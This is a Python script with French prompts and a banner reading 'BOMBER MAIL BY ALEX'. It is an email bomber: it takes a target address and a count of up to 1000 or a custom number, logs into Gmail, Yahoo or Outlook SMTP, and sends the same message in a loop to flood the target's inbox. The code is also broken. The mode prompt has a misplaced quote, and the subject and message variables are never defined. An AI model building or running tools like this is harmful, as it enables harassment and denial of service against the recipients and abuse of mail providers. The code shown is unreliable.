
#LISTE DES IMPORTS
from random import randint
import smtplib
import sys
import time




class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ORANGE = '#\033[95m'


def banner():
    print(bcolors.ORANGE + '''
888888b.   .d88888b. 888b     d888888888b.  88888888888888888b.  
888  "88b d88P" "Y88b8888b   d8888888  "88b 888       888   Y88b 
888  .88P 888     88888888b.d88888888  .88P 888       888    888 
8888888K. 888     888888Y88888P8888888888K. 8888888   888   d88P 
888  "Y88b888     888888 Y888P 888888  "Y88b888       8888888P"  
888    888888     888888  Y8P  888888    888888       888 T88b   
888   d88PY88b. .d88P888   "   888888   d88P888       888  T88b  
8888888P"  "Y88888P" 888       8888888888P" 8888888888888   T88b 
                                                                 
                                                                 
                                                                 
888b     d888       d888888888888888888b.    888888b.Y88b   d88P 
8888b   d8888      d88888  888  888  "Y88b   888  "88bY88b d88P  
88888b.d88888     d88P888  888  888    888   888  .88P Y88o88P   
888Y88888P888    d88P 888  888  888    888   8888888K.  Y888P    
888 Y888P 888   d88P  888  888  888    888   888  "Y88b  888     
888  Y8P  888  d88P   888  888  888    888   888    888  888     
888   "   888 d8888888888  888  888  .d88P   888   d88P  888     
888       888d88P     88888888888888888P"    8888888P"   888     
                                                                 
                                                                 
                                                                 
       d8888888     8888888888Y88b   d88P 
      d88888888     888        Y88b d88P  
     d88P888888     888         Y88o88P   
    d88P 888888     8888888      Y888P    
   d88P  888888     888          d888b    
  d88P   888888     888         d88888b   
 d8888888888888     888        d88P Y88b  
d88P     888888888888888888888d88P   Y88b ''')




class Email_Bomber:
    compteur = 0


    def __init__(self):
            print(bcolors.RED + '_PROGRAMME_EN_COUR_DE_LANCEMENT_')
            self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
            self.mode = int(input(bcolors.GREEN + 'Entrer l\'option que vous souhaiter' (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))


    def bomb(self):
        try:
            print(bcolors.RED + ' Nombre de mail ------>')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Choisir un nombre customizer <: '))
            print(bcolors.RED + f'\n+[+[+[ Vous avez selectionner le mode: {self.mode} et {self.amount} de mail ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
       
            self.server = str(input(bcolors.GREEN + 'Votre Boite Mail ------> 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'
            
            self.fromAddr = str(input(bcolors.GREEN + '_TON_ADRESSE_MAIL_ <: '))
            self.fromPwd = str(input(bcolors.GREEN + '_TON_MDP_ <: '))
            
            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
       

    def send(self):

            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.compteur +=1
            print(bcolors.YELLOW + f'BOMB: {self.compteur}')

    def attack(self):
        print(bcolors.RED + '//_EN_COUR_DATTAQUE_//')
        for email in range(self.amount+1):
            self.send()
            #time.sleep(randint(3, 10))      
        self.s.close()
        print(bcolors.RED + '//_SOLDAT_ATTAQUE_TERMINER_//')
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()


